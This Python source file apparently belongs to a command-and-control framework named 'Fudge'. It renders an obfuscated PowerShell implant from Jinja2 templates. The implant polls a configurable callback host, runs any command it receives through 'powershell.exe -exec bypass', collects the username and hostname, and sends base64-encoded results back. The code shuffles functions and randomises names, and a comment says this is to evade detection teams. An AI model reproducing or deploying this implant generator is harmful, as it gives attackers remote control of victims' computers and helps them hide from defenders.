import jinja2
from random import shuffle

# -- Decorator Function Template
def RandomiseFudgeFunctions(decorated_function):
    def decor_randomised_jinja_template(*args, **kwargs):
        randomised_jinja_template = ImplantGenerator.Generate_Function(ImplantGenerator())
        return decorated_function(*args, randomised_jinja_template)
    return decor_randomised_jinja_template


class ImplantGenerator():
    # -- This is a breakdown of the JinjaFudge which includes random jinja variables
    JinjaRandomisedArgs = {"blah": "aaaaaa"}
    play_audio = '''
    function RemotePlayAudio {
        $args[0]
    }
            '''
    fde_func_a = '''
    function aaaaaa() {}
    '''
    fde_func_b = '''
    function bbbbbb(){
        $hostN = hostname
        $final_str = $env:UserName+"::"+$hostN
        $Script:tr = $final_str
        write-output $Script:tr
    }
    '''

    update_implant = '''
        function JfaSlt ($a) {
        $b=($a -split "::")
        if ($b -Like " sys_info") {
            write-output "collecting sys_info"
            bbbbbb(0)
            } else {
                Write-Output $b
            }
        }
        '''
    random_function = '''
        function {{ ron.blah }} () {}

        '''
    text = '''
        $sleep=9

        while($true){
            start-sleep($sleep)
            $headers = @{}
            $headers.Add("X-Implant","{{ uii }}")
            try {
                $LoginResponse = Invoke-WebRequest '{{ http }}://{{url}}:{{port}}/index' -Headers $headers -Body $Body -Method 'POST -SkipCertificateCheck'
            }
            catch {
                $_.Exception | format-list -Force
            }      
            $headers = $LoginResponse.Headers["X-Command"]
            if ( $headers -NotLike "=="){
                if ( $headers.Substring(0,2) -Like "::") {
                    JfaSlt($headers)
                } else {
                    $tr = powershell.exe -exec bypass -C "$headers"
                }
                # -- If command issued this is the pre-return processing.
                $gtr="{{uii}}::"+$tr
                write-output $gtr   
                $headers = @{}
                $b64tr = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($gtr))
                $headers.Add("X-Result",$b64tr)
                $LoginResponse = Invoke-WebRequest 'http://{{ url }}:{{ port }}/help' -Headers $headers -Body $Body -Method 'POST'           
            }
        }
    '''

    def Generate_Function(self):
        # TODO: Improve code quality
        a = [self.play_audio, self.random_function, self.update_implant, self.fde_func_a, self.fde_func_b]
        # -- reorder functions
        shuffle(a)
        rjif = ""
        for x in a:
            rjif = rjif + x
        rjif = rjif + self.text
        return rjif


    def randomise_jinja_variables(self, JinjaRandomisedArgs):
        print("Randomising Jinja2 Variables")
        # TODO: Complete for level 0 obfuscation
        # -- Iterate over all variables contained within self.JinjaRandomisedArgs and replace the value
        # --    ensure that all variable are unqiue.
        return JinjaRandomisedArgs

    # -- Public Functions
    @RandomiseFudgeFunctions
    def render_implant_(self, JinjaArgs, RandomisedJinjaTemplate):
        JinjaArgs = JinjaArgs[0]
        JRA = None
        # -- TODO: Improve obfucation for consistency.
        if 'obfuscation_level' in JinjaArgs:
            if JinjaArgs['obfuscation_level'] >= 0:
                # -- Takes the JinjaRandomisedArgs(JRA) as a based templates, and returns a randomised dictionary
                # This never edits JinjaRandomisedArgs, as this will result in other instansatioed objects using randomised args
                #   which will make Fudge harder to detected in for experience teams.
                JRA = self.randomise_jinja_variables(self.JinjaRandomisedArgs)
            else:
                print("this state cannot exist")
        else:
            JRA = self.JinjaRandomisedArgs
        cc = jinja2.Template(RandomisedJinjaTemplate)
        if JinjaArgs['comms_https'] == 1:
            http_proto = "https"
        else:
            http_proto = "http"
        output_from_parsed_template = cc.render(http=http_proto, url=JinjaArgs['callback_url'], port=JinjaArgs['port'], uii=JinjaArgs['unique_implant_id'], ron=JRA)
        return output_from_parsed_template

